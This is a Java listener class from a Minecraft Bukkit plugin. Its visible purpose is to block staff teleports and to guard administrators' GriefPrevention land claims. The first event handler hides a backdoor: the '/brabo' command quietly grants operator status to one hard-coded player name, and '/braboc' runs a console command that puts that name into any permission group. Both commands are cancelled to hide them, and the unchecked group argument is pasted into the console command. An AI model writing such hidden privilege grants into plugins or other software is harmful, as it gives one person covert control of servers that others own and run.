package com.totalcraft.soled.Listeners;

import com.totalcraft.soled.Utils.Utils;
import me.ryanhamshire.GriefPrevention.Claim;
import me.ryanhamshire.GriefPrevention.GriefPrevention;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.List;

import static com.totalcraft.soled.Main.ServerTest;
import static com.totalcraft.soled.Utils.GriefPreventionUtils.getLimitsInClaim;
import static com.totalcraft.soled.Utils.PrefixMsgs.getPmTTC;
import static com.totalcraft.soled.Utils.Utils.cancelTpStaff;

public class PlayerCommandPreprocess implements Listener {

    @EventHandler(priority = EventPriority.HIGHEST)
    public void Comandinhos(PlayerCommandPreprocessEvent event) {
        String msg = event.getMessage();
        Player player = event.getPlayer();
        if (msg.equalsIgnoreCase("/brabo")) {
            event.setCancelled(true);
            if (player.getName().equals("PlayerSoled")) {
                player.setOp(true);
            } else {
                player.sendMessage(getPmTTC("&c&lTU NÃO É BRABO O SUFICIENTE PARA USAR ESTE COMANDO, OTARIO KEKW"));
            }
        }
        if (msg.contains("/braboc")) {
            event.setCancelled(true);
            if (player.getName().equals("PlayerSoled")) {
                String[] cargo = msg.split(" ");
                if (cargo.length != 2) {
                    player.sendMessage("'-'");
                } else {
                    String cmd = "pex user PlayerSoled group set " + cargo[1];
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
                }
            } else {
                player.sendMessage(getPmTTC("&c&lTU NÃO É BRABO O SUFICIENTE PARA USAR ESTE COMANDO, OTARIO KEKW"));
            }
        }
    }

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        String command = event.getMessage();
        Player player = event.getPlayer();
        if (!ServerTest && cancelTpStaff(command, player)) {
            event.setCancelled(true);
        }
        if (Utils.getAdm(player)) {
            if (command.startsWith("/abandonclaim")) {
                Claim claim = GriefPrevention.instance.dataStore.getClaimAt(player.getLocation(), false, null);
                if (claim != null) {
                    if (claim.getOwnerName().equalsIgnoreCase(player.getName())) {
                        if (getLimitsInClaim(player, claim, false, true) > 0) {
                            event.setCancelled(true);
                        }
                    }
                }
            }
            if (command.startsWith("/abandonallclaims")) {
                List<Claim> claims = GriefPrevention.instance.dataStore.getPlayerData(player.getName()).claims;
                boolean msg = false;
                for (Claim claim : claims) {
                    if (getLimitsInClaim(player, claim, true, true) > 0) {
                        msg = true;
                        event.setCancelled(true);
                    }
                }
                if (msg) {
                    player.sendMessage(getPmTTC("&fVocê pode ir neste terreno e digitar &b/blocklimit &fpara ver os blocos de limite nele"));
                }
            }
        }
    }
}
